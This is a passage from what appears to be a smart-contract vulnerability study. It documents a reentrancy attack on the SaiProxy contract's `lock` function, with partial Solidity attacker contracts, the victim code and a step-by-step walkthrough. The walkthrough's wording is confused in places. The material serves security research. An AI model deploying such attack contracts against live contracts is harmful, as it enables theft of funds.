#################################################
Evaluations and Analysis on 76354 Smart Contracts
#################################################

**Contract Name**

SaiProxy

**Contract Address**

0x526af336D614adE5cc252A407062B8861aF998F5

**Transaction Count**

9987

**Invovled Ethers**

107172.49 Ethers

**Length of the Call Chain**

4 external function

**Victim Function**

``lock``

**Attack Mechanisim**

Attack code:
::

    contract TubInterface {
        constructor() payable {}
        SaiProxy s;
        address victim;
        bytes32 temp;
        address gemp;
        function setVictim(address _addr, address _gem) {
            s = SaiProxy(_addr);
            victim = _addr;
            gemp = _gem;
        }
        ...
        function cups(bytes32 cup) public returns (address, uint, uint, uint){
            return (victim, 0, 0, 0);
        }
        function gem() public view returns (TokenInterface){
            return(TokenInterface(gemp));
        }
        ...
    }

    contract TokenInterface {
        bytes32 temp;
        address tubbb;
        SaiProxy s;
        TubInterface tub = new TubInterface();
        function setVictim(address _addr, address _tub) {
            s = SaiProxy(_addr);
            tubbb = _tub;
        }
        constructor() payable {}
        ...
        function deposit() public payable{
            s.lock.value(1 ether)(tubbb, temp);
                //s.open(this);
        }
        ...
    }

Attacked code:
::

    contract SaiProxy is DSMath {
        ...
        function lock(address tub_, bytes32 cup) public payable {
            if (msg.value > 0) {
                TubInterface tub = TubInterface(tub_);

                (address lad,,,) = tub.cups(cup);
                require(lad == address(this), "cup-not-owned");

                tub.gem().deposit.value(msg.value)();
                ...
            }
        }
    }

In this case, the goal of our reentrancy is ``tub.gem().deposit.value(msg.value)();`` in the victim code. To reach our goal we need pass three conditions. Firstly we need to make sure the *msg.value* is greater than 0. Next we need to declare a new ``TuberInterface`` instance and call its ``cups`` function to return a address to the variable ``lad``. Last, we need to make sure the address stored in `lad` equals to the address of the victim contract.

**Preparation.** We call ``setVictim`` function in attack code to set the address of victim code to the variable ``_addr`` and set the address of the other attack contract ``TokenInterface`` to ``_gem``. Next we call the other ``setVictim`` function in contract ``TokenInterface`` then set the address of victim code to ``_addr`` and set ``tubbb`` an address the same as ``_addr``. 

**Attack.** The attacker call `deposit` function, it calls ``lock`` function in victim contract.  The ``if`` condition is satisfied because we our call is appended by ``.value``. Next, the contract initialize  an instance of the contract ``TubInterface`` and call ``cup`` to get the address. Unfortunately, the function involved in this attack is well manipulated and we won't let it fail. Then the contract checks whether the ``lad`` equals to the address of the victim contract. It doesn't work. We finally get to the key statement ``tub.gem().deposit`` which calls back to the `gem` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.